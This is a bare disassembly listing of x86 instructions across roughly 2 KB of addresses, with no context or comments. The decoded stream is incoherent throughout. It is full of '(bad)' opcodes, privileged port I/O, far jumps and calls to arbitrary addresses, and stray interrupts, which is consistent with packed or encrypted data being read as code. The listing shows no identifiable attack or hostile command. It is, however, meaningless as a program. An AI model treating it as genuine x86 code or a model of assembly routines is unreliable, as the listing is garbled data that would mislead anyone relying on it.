  40d878:	adc    eax,DWORD PTR [edx+0x37]
  40d87b:	in     al,dx
  40d87c:	push   0x3c
  40d87e:	cmc    
  40d87f:	(bad)  
  40d880:	mov    bh,0x3a
  40d882:	xor    al,BYTE PTR [esi]
  40d884:	pop    ecx
  40d885:	xor    eax,0x71f2aac3
  40d88a:	sub    eax,0x30b09748
  40d88f:	test   DWORD PTR [esi-0x36],edx
  40d892:	mov    esp,0x5b07d28e
  40d897:	xchg   esp,eax
  40d898:	mov    ebp,esp
  40d89a:	lock jle 0x40d900
  40d89d:	mov    BYTE PTR [ecx],bl
  40d89f:	jmp    0x751654c5
  40d8a4:	fcomp  DWORD PTR [eax]
  40d8a6:	cmc    
  40d8a7:	cmp    edi,DWORD PTR [eax+0x1a]
  40d8aa:	ins    BYTE PTR es:[edi],dx
  40d8ab:	xchg   edi,eax
  40d8ac:	mov    cl,0x10
  40d8ae:	xchg   edi,eax
  40d8af:	hlt    
  40d8b0:	out    0x2a,eax
  40d8b2:	fldcw  WORD PTR [edx+esi*4+0x3266dfb3]
  40d8b9:	(bad)  
  40d8ba:	ins    DWORD PTR es:[edi],dx
  40d8bb:	inc    ebx
  40d8bc:	call   0x2c68:0x54483b48
  40d8c3:	push   esp
  40d8c4:	inc    edx
  40d8c5:	inc    edi
  40d8c6:	adc    ah,0xda
  40d8c9:	fsub   QWORD PTR [ebp+ebp*2+0x72]
  40d8cd:	pop    edi
  40d8ce:	add    al,0xc3
  40d8d0:	sub    eax,0xdfaee24f
  40d8d5:	dec    ebx
  40d8d6:	jne    0x40d927
  40d8d8:	xchg   edx,eax
  40d8d9:	mov    eax,ds:0xd789d2f
  40d8de:	dec    ecx
  40d8df:	mov    al,ds:0xb8ac829e
  40d8e4:	pop    eax
  40d8e5:	pop    ecx
  40d8e6:	lock sub edx,esi
  40d8e9:	and    bl,dh
  40d8eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8ec:	mov    al,ds:0xe00abcb7
  40d8f1:	mov    cl,ch
  40d8f3:	cld    
  40d8f4:	or     al,0x4d
  40d8f6:	adc    BYTE PTR [ecx],dl
  40d8f8:	jl     0x40d96b
  40d8fa:	test   eax,0xfbf55348
  40d8ff:	aaa    
  40d900:	jns    0x40d88a
  40d902:	frstor [esi+0x5718a50a]
  40d908:	jp     0x40d94e
  40d90a:	push   0x3b
  40d90c:	dec    eax
  40d90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90e:	in     al,0x94
  40d910:	test   dl,bh
  40d912:	inc    edi
  40d913:	push   ds
  40d914:	out    0x12,eax
  40d916:	shl    ebp,cl
  40d918:	call   0x73815209
  40d91d:	jne    0x40d946
  40d91f:	pop    esi
  40d920:	xor    esi,DWORD PTR [ebp+0x6d]
  40d923:	dec    esp
  40d924:	push   ds
  40d925:	ret    
  40d926:	fstp   QWORD PTR [ecx-0x5b7fae93]
  40d92c:	push   0x3f
  40d92e:	push   ebp
  40d92f:	inc    esi
  40d930:	mov    ah,0x38
  40d932:	or     al,0x9d
  40d934:	xor    eax,DWORD PTR [edx+0x36]
  40d937:	push   ebx
  40d938:	ret    
  40d939:	js     0x40d8d8
  40d93b:	mov    DWORD PTR [esp+ebp*1],edi
  40d93e:	clflush BYTE PTR [ebp-0x4525286b]
  40d945:	pop    ss
  40d946:	(bad)  
  40d947:	repz or bl,BYTE PTR [edx+0x7fc88021]
  40d94e:	mov    edx,0x93d798fa
  40d953:	loop   0x40d964
  40d955:	xchg   esi,eax
  40d956:	rcr    bh,0x9b
  40d959:	inc    ebp
  40d95a:	xchg   edx,eax
  40d95b:	jb     0x40d989
  40d95d:	hlt    
  40d95e:	pop    esp
  40d95f:	xor    eax,0x81b50320
  40d964:	aam    0x90
  40d966:	fcomp  DWORD PTR [ebx-0x12]
  40d969:	xchg   edx,eax
  40d96a:	sub    ch,dl
  40d96c:	xor    eax,0x84f4e96a
  40d971:	pushf  
  40d972:	xchg   ebx,eax
  40d973:	sbb    eax,0x8b38c650
  40d978:	sbb    eax,0x7fa983fc
  40d97d:	dec    ebp
  40d97e:	jns    0x40d904
  40d980:	out    dx,al
  40d981:	rcr    DWORD PTR [ecx],1
  40d983:	lods   eax,DWORD PTR ds:[esi]
  40d984:	int3   
  40d985:	cmp    BYTE PTR [esi-0x1b],dl
  40d988:	sbb    BYTE PTR [edi-0x1e],dh
  40d98b:	pop    ss
  40d98c:	fsub   DWORD PTR [edi-0x1579baff]
  40d992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d993:	inc    ecx
  40d994:	add    ecx,esp
  40d996:	cmp    al,0xe6
  40d998:	add    al,0xbc
  40d99a:	pop    ds
  40d99b:	cmp    eax,0x4d76c46
  40d9a0:	pop    eax
  40d9a1:	clc    
  40d9a2:	jecxz  0x40d977
  40d9a4:	xchg   DWORD PTR [ebx],eax
  40d9a6:	mov    ecx,0x607b9375
  40d9ab:	sbb    al,0x85
  40d9ad:	(bad)  
  40d9ae:	and    eax,0x72a433ce
  40d9b3:	(bad)
  40d9b7:	push   ebx
  40d9b8:	dec    esi
  40d9b9:	fild   WORD PTR [ecx-0x64]
  40d9bc:	js     0x40d973
  40d9be:	pushf  
  40d9bf:	cmp    al,0xd
  40d9c1:	xchg   DWORD PTR [edx],eax
  40d9c3:	push   esp
  40d9c4:	sub    DWORD PTR [ecx],esi
  40d9c6:	xor    al,0xc5
  40d9c8:	push   ds
  40d9c9:	push   ecx
  40d9ca:	aas    
  40d9cb:	jb     0x40d985
  40d9cd:	jp     0x40d9aa
  40d9cf:	mov    eax,ds:0xd12323c1
  40d9d4:	aaa    
  40d9d5:	ret    
  40d9d6:	cmp    al,0x9d
  40d9d8:	cmp    eax,DWORD PTR ds:0x59a4a191
  40d9de:	cmp    BYTE PTR [edx],ch
  40d9e0:	arpl   WORD PTR [edx],cx
  40d9e2:	out    0x7e,eax
  40d9e4:	push   es
  40d9e5:	push   edx
  40d9e6:	sbb    BYTE PTR [edi],cl
  40d9e8:	xor    DWORD PTR [esi-0x7905ffc3],esp
  40d9ee:	pop    esp
  40d9ef:	xor    al,0xcc
  40d9f1:	lahf   
  40d9f2:	xor    BYTE PTR [esp+ecx*8-0x4a1a8a5f],ch
  40d9f9:	cld    
  40d9fa:	cmp    al,0x3f
  40d9fc:	jl     0x40d995
  40d9fe:	mov    edi,0xd0f2dc70
  40da03:	les    edi,FWORD PTR [ebp+0x57be9267]
  40da09:	inc    ecx
  40da0a:	test   BYTE PTR [edx],ch
  40da0c:	push   edi
  40da0d:	jle    0x40da22
  40da0f:	imul   ebx,edx,0x1e073878
  40da15:	jno    0x40da0e
  40da17:	mov    bl,BYTE PTR [ebx-0x2cf7d1b5]
  40da1d:	retf   
  40da1e:	fld    QWORD PTR [edx]
  40da20:	lea    eax,[esi-0x6a]
  40da23:	outs   dx,BYTE PTR ds:[esi]
  40da24:	inc    esi
  40da25:	and    DWORD PTR [edx],0x65
  40da28:	shl    BYTE PTR [edi+0x717ef772],cl
  40da2e:	inc    ebx
  40da2f:	rcl    DWORD PTR ds:0xa688178b,0xd8
  40da36:	aad    0x9
  40da38:	and    dl,BYTE PTR [edi-0x7d]
  40da3b:	gs jns 0x40da4b
  40da3e:	push   0xfe9e8c0c
  40da43:	push   0xffffffcd
  40da45:	and    edx,DWORD PTR [edx]
  40da47:	jp     0x40da03
  40da49:	repnz or edi,DWORD PTR [eax]
  40da4c:	jge    0x40da36
  40da4e:	ja     0x40da1a
  40da50:	push   ebx
  40da51:	ret    
  40da52:	pop    eax
  40da53:	inc    esi
  40da54:	inc    ecx
  40da55:	push   cs
  40da56:	sub    edx,esp
  40da58:	sub    DWORD PTR [esi+eiz*2-0x2b],edx
  40da5c:	mov    al,ds:0x6712737c
  40da61:	jo     0x40da95
  40da63:	imul   eax,DWORD PTR [esi+0x50f15433],0xffffff8e
  40da6a:	push   es
  40da6b:	in     eax,dx
  40da6c:	dec    ecx
  40da6d:	jg     0x40da89
  40da6f:	pop    ecx
  40da70:	call   0xac34:0x6cc2c1e2
  40da77:	xor    eax,0xd3df1de3
  40da7c:	add    al,0xe6
  40da7e:	push   eax
  40da7f:	je     0x40da07
  40da81:	mov    ds:0x95636d29,eax
  40da86:	and    eax,0x4bd8322d
  40da8b:	loope  0x40da96
  40da8d:	cs jg  0x40da70
  40da90:	xchg   ebp,ebp
  40da92:	and    esi,esp
  40da94:	call   0x193fc8bd
  40da99:	fwait
  40da9a:	call   0x8ace:0x99bf09fc
  40daa1:	out    0x25,eax
  40daa3:	xor    al,0x54
  40daa5:	or     eax,0xc07ca0f0
  40daaa:	jmp    0x1a8695c3
  40daaf:	dec    ebp
  40dab0:	es cdq 
  40dab2:	in     eax,dx
  40dab3:	dec    ebp
  40dab4:	stos   DWORD PTR es:[edi],eax
  40dab5:	mov    ebx,0xc50ad8a1
  40daba:	push   esp
  40dabb:	push   esi
  40dabc:	fistp  DWORD PTR [ebx]
  40dabe:	pop    ecx
  40dabf:	aas    
  40dac0:	mov    eax,ds:0xaa85c382
  40dac5:	xor    bl,BYTE PTR [edi]
  40dac7:	push   0xb73f274
  40dacc:	fnstcw WORD PTR [edx-0x72]
  40dacf:	les    edx,FWORD PTR [ebx-0x647013d]
  40dad5:	loop   0x40dab6
  40dad7:	pop    ebp
  40dad8:	xlat   BYTE PTR ds:[ebx]
  40dad9:	or     esp,ebp
  40dadb:	mov    bl,0x95
  40dadd:	out    dx,eax
  40dade:	jmp    0xda57e5a8
  40dae3:	mov    dl,al
  40dae5:	fprem  
  40dae7:	jge    0x40db0b
  40dae9:	cmp    al,0x12
  40daeb:	adc    edx,edi
  40daed:	inc    ebx
  40daee:	int    0xfc
  40daf0:	adc    eax,0x6241c07b
  40daf5:	jecxz  0x40db07
  40daf7:	and    edx,DWORD PTR [edx]
  40daf9:	push   ebx
  40dafa:	and    al,0x94
  40dafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dafd:	popf   
  40dafe:	ror    DWORD PTR [ecx-0x7e],1
  40db01:	push   eax
  40db02:	sbb    BYTE PTR [esi],0xb1
  40db05:	(bad)  ds:0x4be33657
  40db0b:	pop    ds
  40db0c:	jp     0x40db09
  40db0e:	cmp    dl,dh
  40db10:	jmp    0x4dfa:0x22664904
  40db17:	into   
  40db18:	push   ecx
  40db19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db1a:	js     0x40db11
  40db1c:	jg     0x40db60
  40db1e:	je     0x40dad8
  40db20:	scas   eax,DWORD PTR es:[edi]
  40db21:	inc    esi
  40db22:	jge    0x40db6b
  40db24:	mov    ebx,0x7cce72a
  40db29:	pop    ss
  40db2a:	mov    ds:0xf4012f54,al
  40db2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db30:	adc    dh,BYTE PTR [ecx-0x4a]
  40db33:	mov    bl,BYTE PTR [ebp-0x488c5a19]
  40db39:	mov    ds:0x5418fcbe,eax
  40db3e:	adc    dh,BYTE PTR [edi-0x311139e5]
  40db44:	xor    BYTE PTR [eax-0x40],dl
  40db47:	stos   DWORD PTR es:[edi],eax
  40db48:	data16 idiv BYTE PTR ds:0xf7c83640
  40db4f:	push   ss
  40db50:	mov    dh,0xba
  40db52:	sar    DWORD PTR [edi],0xc1
  40db55:	div    eax
  40db57:	jbe    0x40dbb1
  40db59:	es sub eax,0xe76d677b
  40db5f:	pop    ebp
  40db60:	(bad)  
  40db62:	push   cs
  40db63:	mov    WORD PTR [esi],ds
  40db65:	or     WORD PTR [eax+0x71a34ff6],0xdf00
  40db6e:	mov    ds:0xff747705,eax
  40db73:	cmp    BYTE PTR [ebp-0xcf787c1],cl
  40db79:	jmp    0x40db5a
  40db7b:	xor    esp,DWORD PTR [ebx+eax*4+0x6]
  40db7f:	push   ebx
  40db80:	dec    ecx
  40db81:	jecxz  0x40db09
  40db83:	push   edi
  40db84:	imul   BYTE PTR [edx+ebx*2+0x40fe91f2]
  40db8b:	aaa    
  40db8c:	ins    DWORD PTR es:[edi],dx
  40db8d:	and    BYTE PTR [esi-0x78861af2],dl
  40db93:	stos   DWORD PTR es:[edi],eax
  40db94:	jp     0x40db39
  40db96:	scas   al,BYTE PTR es:[edi]
  40db97:	sbb    BYTE PTR [esi+ebp*2-0x70],0x59
  40db9c:	pop    ebp
  40db9d:	aam    0xaa
  40db9f:	pusha  
  40dba0:	out    dx,al
  40dba1:	shl    BYTE PTR ds:0x9c4c5178,cl
  40dba7:	js     0x40db69
  40dba9:	fimul  DWORD PTR [edi]
  40dbab:	sub    bl,BYTE PTR [edx+0x45]
  40dbae:	cdq    
  40dbaf:	add    DWORD PTR [edi+0x7d24ecd],ebp
  40dbb5:	fwait
  40dbb6:	xchg   esi,eax
  40dbb7:	dec    edx
  40dbb8:	inc    edx
  40dbb9:	jnp    0x40db77
  40dbbb:	mov    dh,0xd9
  40dbbd:	inc    edx
  40dbbe:	test   BYTE PTR [edi],cl
  40dbc0:	jns    0x40dbd4
  40dbc2:	jge    0x40dbc2
  40dbc4:	dec    esp
  40dbc5:	loope  0x40dc10
  40dbc7:	loopne 0x40db9a
  40dbc9:	mov    dl,BYTE PTR [esi+0x58]
  40dbcc:	ret    
  40dbcd:	push   esi
  40dbce:	(bad)  
  40dbcf:	test   eax,0xc8ca8f93
  40dbd4:	popa   
  40dbd5:	and    ch,ch
  40dbd7:	fst    DWORD PTR [edx-0x22]
  40dbda:	(bad)  
  40dbdc:	ins    BYTE PTR es:[edi],dx
  40dbdd:	cld    
  40dbde:	cmp    al,0xed
  40dbe0:	out    0xdf,al
  40dbe2:	mov    bl,0x4a
  40dbe4:	ror    BYTE PTR [edi+0x221a9920],1
  40dbea:	or     BYTE PTR [esp+ebp*1],ah
  40dbed:	sbb    BYTE PTR [edx-0x74],0x24
  40dbf1:	ss gs stos BYTE PTR es:[edi],al
  40dbf4:	(bad)  
  40dbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbf6:	dec    ebx
  40dbf7:	or     eax,0x71feb5f1
  40dbfc:	pop    ebp
  40dbfd:	mov    esp,DWORD PTR [eax+0xf3e72d7]
  40dc03:	frstor [edx+0xd]
  40dc06:	lods   al,BYTE PTR ds:[esi]
  40dc07:	add    bh,BYTE PTR [ecx+eiz*1+0x4794fc67]
  40dc0e:	mov    bh,0xec
  40dc10:	rol    BYTE PTR [esi],0xe4
  40dc13:	loop   0x40dbce
  40dc15:	xchg   esi,eax
  40dc16:	push   esi
  40dc17:	xchg   edi,eax
  40dc18:	mov    eax,ds:0xa68d7cad
  40dc1d:	cmc    
  40dc1e:	pop    es
  40dc1f:	cld    
  40dc20:	pop    eax
  40dc21:	inc    ebp
  40dc22:	test   eax,0xada3e530
  40dc27:	fsubp  st(4),st
  40dc29:	lock xor DWORD PTR [edi+0x61777ba2],0xfffffffc
  40dc31:	retf   0xca7
  40dc34:	pop    ecx
  40dc35:	hlt    
  40dc36:	aas    
  40dc37:	push   ds
  40dc38:	in     eax,dx
  40dc39:	shl    BYTE PTR [ebx+0x1a],cl
  40dc3c:	sbb    eax,0xc92a273c
  40dc41:	push   0xffffffe6
  40dc43:	mov    dh,0x42
  40dc45:	inc    esp
  40dc46:	fdiv   QWORD PTR [esi-0x13]
  40dc49:	mov    bh,0x78
  40dc4b:	push   es
  40dc4c:	js     0x40dc7f
  40dc4e:	daa    
  40dc4f:	add    al,0xec
  40dc51:	ss pop eax
  40dc53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc54:	sub    eax,0x2e6af68
  40dc59:	lds    edi,FWORD PTR [edi]
  40dc5b:	and    ch,dh
  40dc5d:	xchg   ebx,eax
  40dc5e:	xor    ah,0xce
  40dc61:	pop    ds
  40dc62:	mov    BYTE PTR [edx],bl
  40dc64:	std    
  40dc65:	nop
  40dc66:	sbb    ch,BYTE PTR [esi]
  40dc68:	sbb    ebp,eax
  40dc6a:	sti    
  40dc6b:	xor    DWORD PTR [edx-0x7],esp
  40dc6e:	push   eax
  40dc6f:	or     BYTE PTR ds:0xb4285b48,dl
  40dc75:	in     eax,0xd
  40dc77:	shl    DWORD PTR [edx+0x0],1
  40dc7a:	xor    DWORD PTR [eax+0x25],0x59
  40dc7e:	xchg   ebx,eax
  40dc7f:	add    BYTE PTR [edx+0x39],cl
  40dc82:	shr    BYTE PTR [edx],cl
  40dc84:	stos   BYTE PTR es:[edi],al
  40dc85:	cmp    BYTE PTR [ecx],al
  40dc87:	pop    edx
  40dc88:	loopne 0x40dcfd
  40dc8a:	stos   DWORD PTR es:[edi],eax
  40dc8b:	mov    ch,0x62
  40dc8d:	int3   
  40dc8e:	scas   eax,DWORD PTR es:[edi]
  40dc8f:	ins    DWORD PTR es:[edi],dx
  40dc90:	adc    al,0xd5
  40dc92:	outs   dx,DWORD PTR ds:[esi]
  40dc93:	pop    ebp
  40dc94:	into   
  40dc95:	pusha  
  40dc96:	jae    0x40dc3c
  40dc98:	loopne 0x40dc63
  40dc9a:	cli    
  40dc9b:	and    BYTE PTR [ebp+0x740d34d5],ch
  40dca1:	xchg   DWORD PTR [ebx+0x5a35e112],eax
  40dca7:	daa    
  40dca8:	mov    al,ds:0x3a070087
  40dcad:	dec    ebx
  40dcae:	jb     0x40dc51
  40dcb0:	mov    ebp,DWORD PTR [esi]
  40dcb2:	cmp    BYTE PTR [edi-0x27],al
  40dcb5:	ins    DWORD PTR es:[edi],dx
  40dcb6:	rol    BYTE PTR [eax],cl
  40dcb8:	adc    DWORD PTR [ecx],edi
  40dcba:	scas   eax,DWORD PTR es:[edi]
  40dcbb:	cwde   
  40dcbc:	add    BYTE PTR [eax+0x70],bl
  40dcbf:	shl    DWORD PTR [esi+0x3c521c0b],cl
  40dcc5:	aad    0x13
  40dcc7:	popf   
  40dcc8:	pop    es
  40dcc9:	fdiv   QWORD PTR [edx+0xa069b5a]
  40dccf:	fcom   QWORD PTR [eax+0x1]
  40dcd2:	sub    BYTE PTR [ebp-0x4b],bl
  40dcd5:	mov    dh,BYTE PTR [ebp-0x4bfb4307]
  40dcdb:	ror    BYTE PTR [eax],cl
  40dcdd:	bound  ebx,QWORD PTR [ecx]
  40dcdf:	dec    eax
  40dce0:	dec    ecx
  40dce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dce2:	mov    edx,0x73e7499e
  40dce7:	jae    0x40dcd5
  40dce9:	cmp    eax,0x15c34641
  40dcee:	test   eax,0x24845e0d
  40dcf3:	dec    esi
  40dcf4:	out    0xc1,al
  40dcf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcf7:	jmp    0x40dd65
  40dcf9:	jge    0x40dd24
  40dcfb:	cmp    ebp,ebp
  40dcfd:	or     eax,0xc1755190
  40dd02:	ret    
  40dd03:	adc    eax,0xb047c208
  40dd08:	xor    esp,DWORD PTR [eax+0x75]
  40dd0b:	mov    bl,0xd2
  40dd0d:	aam    0x35
  40dd0f:	hlt    
  40dd10:	push   eax
  40dd11:	xor    BYTE PTR [ebx-0x93b7c2],dh
  40dd17:	out    0xda,al
  40dd19:	sbb    eax,0xa55be099
  40dd1e:	in     eax,0x9b
  40dd20:	jg     0x40dcb6
  40dd22:	outs   dx,BYTE PTR ds:[esi]
  40dd23:	cwde   
  40dd24:	lea    edx,[eax+0x3b]
  40dd27:	pop    ss
  40dd28:	add    eax,0x35df91c5
  40dd2d:	cmp    DWORD PTR [esi+ecx*8-0x3b4b623d],0xfffffff9
  40dd35:	shr    esp,0x27
  40dd38:	test   eax,0x3cb4eddd
  40dd3d:	arpl   WORD PTR [ecx-0x2f],di
  40dd40:	scas   al,BYTE PTR es:[edi]
  40dd41:	pop    ss
  40dd42:	sub    eax,0x76181e42
  40dd47:	lods   eax,DWORD PTR ds:[esi]
  40dd48:	jmp    0x40dce6
  40dd4a:	xor    al,0xd2
  40dd4c:	mov    dl,0x6d
  40dd4e:	out    0xa5,al
  40dd50:	mov    edi,0x3393915
  40dd55:	inc    ecx
  40dd56:	or     al,0xeb
  40dd58:	call   0x1ad:0xdb989471
  40dd5f:	jle    0x40dd07
  40dd61:	mov    ds:0xec202b98,eax
  40dd66:	repz sbb eax,0x9db3c89f
  40dd6c:	inc    ecx
  40dd6d:	jle    0x40ddcf
  40dd6f:	pop    edi
  40dd70:	mov    ah,0x3
  40dd72:	jne    0x40ddeb
  40dd74:	mov    ah,0x51
  40dd77:	xor    DWORD PTR [esi-0x5c],esp
  40dd7a:	jbe    0x40dd05
  40dd7c:	xchg   edx,eax
  40dd7d:	es std 
  40dd7f:	mov    ebx,0xa06cae26
  40dd84:	cmp    cl,0x6b
  40dd87:	add    al,0x51
  40dd8a:	and    DWORD PTR [edi],edx
  40dd8c:	jg     0x40dd11
  40dd8e:	ss enter 0x8fd2,0x86
  40dd93:	int    0xbd
  40dd95:	in     al,0x3e
  40dd97:	mov    edi,esp
  40dd99:	fcmovnb st,st(6)
  40dd9b:	shr    DWORD PTR [ebx],0xc
  40dd9e:	jge    0x40dde1
  40dda0:	mov    ch,cl
  40dda2:	leave  
  40dda3:	shr    esi,1
  40dda5:	push   0x62609687
  40ddaa:	fist   DWORD PTR [edi+edx*8-0x60]
  40ddae:	mov    eax,0x3b319351
  40ddb3:	out    dx,al
  40ddb4:	jnp    0x40dda2
  40ddb6:	push   eax
  40ddb7:	es loope 0x40dd98
  40ddba:	out    dx,al
  40ddbb:	xchg   edx,eax
  40ddbc:	mov    ecx,0xe72a048d
  40ddc1:	imul   esi,DWORD PTR [edi+0x5],0x5dbece2e
  40ddc8:	mov    edx,0xfb48492f
  40ddcd:	pop    edx
  40ddce:	or     eax,0xf58d7c4c
  40ddd3:	sub    BYTE PTR [edi+eax*1-0x4b],ah
  40ddd7:	ins    DWORD PTR es:[edi],dx
  40ddd8:	call   0x7f7:0x15359e31
  40dddf:	test   eax,0xdbe23493
  40dde4:	(bad)  
  40dde6:	dec    ecx
  40dde7:	int3   
  40dde8:	fnstenv [esi-0x6b]
  40ddeb:	sbb    eax,0xe6f307c0
  40ddf0:	xor    al,0x45
  40ddf2:	inc    eax
  40ddf3:	pop    edi
  40ddf4:	(bad)  
  40ddf5:	jg     0x40de4f
  40ddf7:	test   al,0xc6
  40ddf9:	add    cl,al
  40ddfb:	sbb    eax,0x5b46858b
  40de00:	dec    ebp
  40de01:	push   edx
  40de02:	xor    eax,0x1f6708e0
  40de07:	inc    ecx
  40de08:	imul   ecx,DWORD PTR [ebx+0x7801a118],0x18ee5204
  40de12:	sbb    al,0x3f
  40de14:	jns    0x40ddb8
  40de16:	lds    eax,FWORD PTR [ebp-0x29afd3cd]
  40de1c:	push   DWORD PTR [esi-0x5de1c159]
  40de22:	add    DWORD PTR [ecx],esi
  40de24:	lods   eax,DWORD PTR ds:[esi]
  40de25:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40de27:	mov    cl,0x64
  40de29:	mov    ch,0xcf
  40de2b:	repnz add DWORD PTR [eax-0x8],0x86366aa3
  40de33:	jae    0x40de82
  40de35:	dec    ebx
  40de36:	cmc    
  40de37:	(bad)  
  40de39:	mov    esp,0x350c043c
  40de3e:	add    al,0x3b
  40de40:	xor    DWORD PTR [ebp+0x3e],esi
  40de43:	bound  ebp,QWORD PTR [ecx-0x2a]
  40de46:	aad    0xad
  40de48:	inc    ebx
  40de49:	jo     0x40de5f
  40de4b:	rcl    DWORD PTR [ebx-0x28],1
  40de4e:	mov    al,0xff
  40de50:	xchg   DWORD PTR [edx],eax
  40de52:	mov    bl,dl
  40de54:	mov    ah,0x12
  40de56:	nop
  40de57:	mov    BYTE PTR [edx-0x5dc1f57f],dh
  40de5d:	jb     0x40deb0
  40de5f:	addr16 icebp 
  40de61:	mov    ecx,DWORD PTR [edi-0x50a03c2a]
  40de67:	adc    dh,BYTE PTR [eax+edi*8-0xf138d86]
  40de6e:	xor    BYTE PTR [edx+0x3edd9f95],bl
  40de74:	add    BYTE PTR [ecx+ebx*4],ah
  40de77:	ins    BYTE PTR es:[edi],dx
  40de78:	imul   edx,DWORD PTR [eax+0x64d12447],0x8c83d66
  40de82:	in     eax,0x8b
  40de84:	jo     0x40deb4
  40de86:	inc    edi
  40de87:	push   ebx
  40de88:	mov    BYTE PTR [edi-0x3f],dh
  40de8b:	cmp    bh,BYTE PTR [edx-0x76]
  40de8e:	xchg   edi,eax
  40de8f:	add    eax,DWORD PTR [esi+0x2c]
  40de92:	lods   al,BYTE PTR ds:[esi]
  40de93:	fwait
  40de94:	or     DWORD PTR [ebx+0x2e729058],ecx
  40de9a:	pop    esi
  40de9b:	sub    ebx,edx
  40de9d:	ret    
  40de9e:	sub    edx,esp
  40dea0:	push   es
  40dea1:	or     ebx,esi
  40dea3:	stc    
  40dea4:	repnz fcom QWORD PTR [ecx+0x55a01454]
  40deab:	clc    
  40deac:	mov    ah,0xac
  40deae:	xchg   BYTE PTR [ebp-0x6d],ch
  40deb1:	xor    BYTE PTR [edx-0x73],ah
  40deb4:	push   es
  40deb5:	out    0x4c,eax
  40deb7:	into   
  40deb8:	daa    
  40deb9:	xlat   BYTE PTR ds:[ebx]
  40deba:	pusha  
  40debb:	xchg   edx,eax
  40debc:	mov    WORD PTR [edi+0xf9abbe8],es
  40dec2:	dec    ebx
  40dec3:	inc    edi
  40dec4:	sub    bh,BYTE PTR [edx+edi*1+0x3061621b]
  40decb:	sub    al,0x66
  40decd:	enter  0x3294,0x2d
  40ded1:	(bad)  
  40ded2:	outs   dx,DWORD PTR ds:[esi]
  40ded3:	ror    BYTE PTR [esi],cl
  40ded5:	retf   0x76de
  40ded8:	cli    
  40ded9:	inc    edi
  40deda:	dec    ebx
  40dedb:	xor    edi,DWORD PTR [edx+0x4]
  40dede:	mov    edi,0x51ce165d
  40dee3:	or     eax,0x24b43abc
  40dee8:	in     eax,0xde
  40deea:	xor    bl,BYTE PTR [esi-0x54b681e6]
  40def0:	stc    
  40def1:	ret    0xb128
  40def4:	repz adc DWORD PTR [edx+ecx*1],ebp
  40def8:	fwait
  40def9:	div    BYTE PTR [ebx]
  40defb:	(bad)  
  40defc:	icebp  
  40defd:	aaa    
  40defe:	xor    edx,edx
  40df00:	adc    al,0xae
  40df02:	es test eax,0x2b902269
  40df08:	and    BYTE PTR [edx-0x189a5be],bh
  40df0e:	data16 fdiv DWORD PTR [ebp-0x3]
  40df12:	daa    
  40df13:	test   al,0xde
  40df15:	dec    edi
  40df16:	stos   DWORD PTR es:[edi],eax
  40df17:	push   ebx
  40df18:	fs mov ecx,0x4c4786c9
  40df1e:	aad    0x73
  40df20:	mov    dl,0xfe
  40df22:	push   ebp
  40df23:	call   DWORD PTR [esp+0x30094fab]
  40df2a:	(bad)  
  40df2b:	in     al,dx
  40df2c:	inc    edx
  40df2d:	cwde   
  40df2e:	cmp    ch,BYTE PTR [edi]
  40df30:	sub    ah,BYTE PTR ds:0xc0b47dac
  40df36:	fcomp  QWORD PTR [edi]
  40df38:	xchg   ebx,eax
  40df39:	imul   eax,DWORD PTR [ecx+ebx*2+0x57e34930],0x12b4f4e4
  40df44:	test   edi,ebp
  40df46:	mov    ds,WORD PTR [esi-0x217de3d1]
  40df4c:	mov    ah,0xba
  40df4e:	xor    BYTE PTR [ebp+0x4ceac9a8],ah
  40df54:	xchg   ebp,eax
  40df55:	xchg   ecx,eax
  40df56:	or     DWORD PTR ds:0xe3971af7,esp
  40df5c:	add    ah,BYTE PTR [ebx-0x17]
  40df5f:	rol    BYTE PTR [edi-0x2a5e1c0c],1
  40df65:	(bad)  
  40df66:	ret    
  40df67:	mov    dl,0x9
  40df69:	test   DWORD PTR [ecx-0x8],0xf23e94d8
  40df70:	dec    ebx
  40df71:	ins    BYTE PTR es:[edi],dx
  40df72:	inc    edi
  40df73:	mov    ah,0xec
  40df75:	ds push ss
  40df77:	pop    esi
  40df78:	and    eax,0x9f601c7f
  40df7d:	and    BYTE PTR [esi],dh
  40df7f:	mov    edx,0x1210b537
  40df84:	xchg   ebp,eax
  40df85:	fst    QWORD PTR [ebx+0x11351de4]
  40df8b:	pop    eax
  40df8c:	sbb    DWORD PTR [eax+0x61],esi
  40df8f:	pusha  
  40df90:	xor    al,0x56
  40df92:	xchg   esp,eax
  40df93:	mov    ah,0x41
  40df95:	xchg   ebp,eax
  40df96:	mov    dh,0x92
  40df98:	call   0xee59:0xa15e760b
  40df9f:	jb     0x40e009
  40dfa1:	pushf  
  40dfa2:	les    eax,FWORD PTR [esi+esi*1+0x92a110c]
  40dfa9:	call   0x7b50:0xf0f983ff
  40dfb0:	mov    edi,0xf49c569
  40dfb5:	(bad)  
  40dfb6:	mov    BYTE PTR [ebp-0xb],cl
  40dfb9:	js     0x40df4d
  40dfbb:	push   es
  40dfbc:	fiadd  WORD PTR [edi+0x42]
  40dfbf:	sub    DWORD PTR [esi+0x4c],edi
  40dfc2:	mov    ebx,0x9153e51f
  40dfc7:	shr    ecx,1
  40dfc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfca:	nop
  40dfcb:	stos   DWORD PTR es:[edi],eax
  40dfcc:	xor    BYTE PTR [edi+0x1675bf3e],bh
  40dfd2:	xor    edi,ebp
  40dfd4:	mov    edx,0x72afcfe5
  40dfd9:	push   0x717d0fa
  40dfde:	int    0x55
  40dfe0:	loop   0x40df6f
  40dfe2:	xchg   BYTE PTR [ebp+0x109e3385],bh
  40dfe8:	ss int 0x21
  40dfeb:	jmp    0xf80b:0xe44e807a
  40dff2:	cmp    al,0xf
  40dff4:	xor    eax,0x71dd76ea
  40dff9:	int    0x8a
  40dffb:	dec    edx
  40dffc:	adc    DWORD PTR [ebp+ecx*8-0x38],ecx
  40e000:	push   eax
  40e001:	adc    eax,0xc3cdec43
